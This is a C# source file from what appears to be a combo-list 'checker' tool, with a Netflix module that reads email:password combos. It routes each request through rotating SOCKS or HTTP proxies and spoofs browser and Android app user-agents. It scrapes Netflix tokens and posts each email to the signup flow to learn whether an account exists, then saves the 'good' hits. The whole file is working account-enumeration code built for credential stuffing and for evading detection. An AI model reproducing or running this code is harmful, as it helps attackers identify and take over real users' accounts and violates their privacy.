using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Netflix
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                //httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                httpRequest.AddHeader("referer", "https://www.google.com/");
                httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("Capture", "Mi Redmi Note 9S ( Mikano Jackson )");
                string str1 = httpRequest.Get("https://www.netflix.com/").ToString();
                string str2 = Cryptography.LR(str1, ",\"authURL\":\"", "\",\"isDVD").FirstOrDefault();
                string auth = System.Text.RegularExpressions.Regex.Unescape(str2);
                //Console.WriteLine(auth);
                string es = Cryptography.LR(str1, "\"data\":{\"esn\":\"", "\",\"").FirstOrDefault();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("accept", "application/json, text/javascript, */*; q=0.01");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
                httpRequest.AddHeader("origin", "https://www.netflix.com");
                httpRequest.AddHeader("referer", "https://www.netflix.com/");
                httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome;v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("user-agent", "com.netflix.mediaclient/35506 (Linux; U; Android 10; en_US; Redmi Note 9S; Build/QKQ1.191215.002; Cronet/76.0.3809.111)");
                httpRequest.AddHeader("x-netflix.client.request.name", "ui/xhrUnclassified");
                httpRequest.AddHeader("x-requested-with", "XMLHttpRequest");
                string str3 = httpRequest.Post("https://www.netflix.com/api/shakti/v3a07708d/flowendpoint?flow=signupSimplicity&mode=welcome&landingURL=%2F&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=trur&esn=" + es + "&languages=en-US&netflixClientPlatform=browser", "{\"flow\":\"signupSimplicity\",\"mode\":\"welcome\",\"authURL\":\"" + auth + "\",\"action\":\"saveAction\",\"fields\":{\"email\":{\"value\":\"" + strArray1[0] + "\"}}}", "application/json").ToString();
                //Console.WriteLine(str3);
                if (str3.Contains("mode\":\"switchFlow\", \""))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Netflix VM");
                    return true;
                }
                else if (str3.Contains("mode\":\"passwordOnly\",\"") || str3.Contains("mode\":\"planSelectionWithContext\", \""))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str3.Contains("registrationWithContext"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Orange);
                    }
                    Program.Save(combo, "Netflix Free");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch (Exception)
            {
                //Console.WriteLine(ex);
                ++Program.Retrie;
                return false;
            }
        }
    }
}
